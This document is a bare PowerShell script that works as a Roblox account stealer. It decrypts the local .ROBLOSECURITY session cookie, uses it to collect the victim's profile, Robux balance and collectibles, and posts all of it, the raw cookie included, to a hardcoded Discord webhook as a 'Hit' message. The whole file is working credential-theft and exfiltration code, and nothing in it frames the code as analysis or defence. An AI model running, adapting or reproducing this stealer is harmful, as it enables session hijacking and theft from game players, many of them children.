$ErrorActionPreference = "Continue"
$WH = "https://discord.com/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
$debugFile = "$env:TEMP\ps_debug.txt"

"Started at $(Get-Date)" | Out-File $debugFile -Force

function dbg($title, $desc, $color) {
    $payload = @{embeds=@(@{title=$title; description=$desc; color=$color})} | ConvertTo-Json -Depth 4 -Compress
    try { Invoke-RestMethod $WH -Method Post -Body $payload -ContentType 'application/json' | Out-Null } catch {}
}

function Get-API($host, $path) {
    try {
        $req = [System.Net.WebRequest]::Create("https://$host$path")
        $req.Headers.Add("Cookie", ".ROBLOSECURITY=$cookie")
        $req.UserAgent = "Roblox/WinInet"
        $res = $req.GetResponse()
        $sr = New-Object System.IO.StreamReader($res.GetResponseStream())
        return $sr.ReadToEnd() | ConvertFrom-Json
    } catch { return $null }
}

"Starting Roblox cookie grab" | Out-File $debugFile -Append
$l = $env:LOCALAPPDATA
$rbxPaths = @("$l\Roblox\LocalStorage\robloxcookies.dat")
$cookie = ""

foreach ($rp in $rbxPaths) {
    if (Test-Path $rp) {
        try {
            $raw = Get-Content $rp -Raw
            if ($raw -match '"CookiesData"\s*:\s*"([^"]+)"') {
                $eb = [Convert]::FromBase64String($Matches[1])
                $db = [Security.Cryptography.ProtectedData]::Unprotect($eb, $null, [Security.Cryptography.DataProtectionScope]::CurrentUser)
                $dec = [Text.Encoding]::UTF8.GetString($db)
                if ($dec -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {
                    $cookie = $Matches[1]
                }
            } elseif ($raw -match '\.ROBLOSECURITY\s*=\s*(_[^;\s]+)') {
                $cookie = $Matches[1]
            }
        } catch {}
    }
}

if ($cookie) {
    "Found cookie: $($cookie.Length) bytes" | Out-File $debugFile -Append
    $me = Get-API "users.roblox.com" "/v1/users/authenticated"
    $uid = if ($me) { $me.id } else { "0" }
    $name = if ($me) { $me.name } else { "Unknown" }
    $display = if ($me) { $me.displayName } else { $name }
    
    $prof = Get-API "users.roblox.com" "/v1/users/$uid"
    $created = if ($prof) { $prof.created } else { "Unknown" }
    $age = 0
    if ($created -ne "Unknown") {
        $age = [math]::Floor(((Get-Date) - [datetime]$created).TotalDays)
    }
    
    $cur = Get-API "economy.roblox.com" "/v1/users/$uid/currency"
    $robux = if ($cur) { $cur.robux } else { 0 }
    
    $coll = Get-API "inventory.roblox.com" "/v1/users/$uid/assets/collectibles?limit=100"
    $hasHeadless = $false
    $hasKorblox = $false
    $rap = 0
    $owned = 0
    if ($coll -and $coll.data) {
        $owned = $coll.data.Count
        foreach ($item in $coll.data) {
            if ($item.assetId -eq 99657 -or $item.assetId -eq 134330133) { $hasHeadless = $true }
            if ($item.assetId -eq 139275807 -or $item.assetId -eq 192) { $hasKorblox = $true }
            $rap += [int]$item.recentAveragePrice
        }
    }
    
    $collStr = "False"
    if ($hasHeadless -and $hasKorblox) { $collStr = "Headless ✅ | Korblox ✅" }
    elseif ($hasHeadless) { $collStr = "Headless ✅ | Korblox ❌" }
    elseif ($hasKorblox) { $collStr = "Headless ❌ | Korblox ✅" }
    
    $th = Get-API "thumbnails.roblox.com" "/v1/users/avatar-headshot?userIds=$uid&size=420x420&format=Png"
    $avatar = "https://tr.rbxcdn.com/..."
    if ($th -and $th.data -and $th.data[0]) { $avatar = $th.data[0].imageUrl }
    
    $embed = @{
        content = "@everyone Hit"
        embeds = @(
            @{
                author = @{ name = "S3R, 13+"; icon_url = $avatar }
                description = "**+1 HIT** · You've Earned 1 Nevora · beams XP`n**Domain:** ``dicerigx.app``"
                color = 16711680
                fields = @(
                    @{ name = "👤 User"; value = "**$display**"; inline = $false }
                    @{ name = "⭐ Password"; value = "``````dreistuff``````"; inline = $false }
                    @{ name = "About User"; value = "**Account Age:** $age Days`n**Location:** United States of America 🇺🇸"; inline = $false }
                    @{ name = "🪙 Robux"; value = "**Balance:** $robux`n**Pending:** 0"; inline = $true }
                    @{ name = "📈 RAP"; value = "**RAP:** $rap`n**Owned:** $owned"; inline = $true }
                    @{ name = "💎 Premium"; value = "**False**"; inline = $true }
                    @{ name = "💳 Billing"; value = "**Credit:** $0`n**Payments:** 0"; inline = $true }
                    @{ name = "🏷️ Collectibles"; value = $collStr; inline = $true }
                    @{ name = "⚙️ Settings"; value = "**Set (Verified):** Disabled`n**Disabled:** Disabled"; inline = $true }
                    @{ name = "🎮 Passes / Played"; value = "Adopt Me ``0`` · **False**`nMurder Mystery 2 ``0`` · **True**`nPet Simulator 99 ``0`` · **False**"; inline = $true }
                    @{ name = "👥 Groups"; value = "**Balance:** 0`n**Pending:** 0`n**Owned:** 0"; inline = $true }
                )
                footer = @{ text = ".ROBLOSECURITY" }
            }
        )
    }
    
    $cookieDisplay = "``````n$cookie`n``````"
    $embed.embeds[0].fields += @{ name = "🔓 .ROBLOSECURITY"; value = $cookieDisplay; inline = $false }
    
    $json = $embed | ConvertTo-Json -Depth 10
    Invoke-RestMethod -Uri $WH -Method Post -Body $json -ContentType "application/json" -ErrorAction SilentlyContinue
    "Sent full embed to Discord" | Out-File $debugFile -Append
} else {
    "No cookie found" | Out-File $debugFile -Append
}
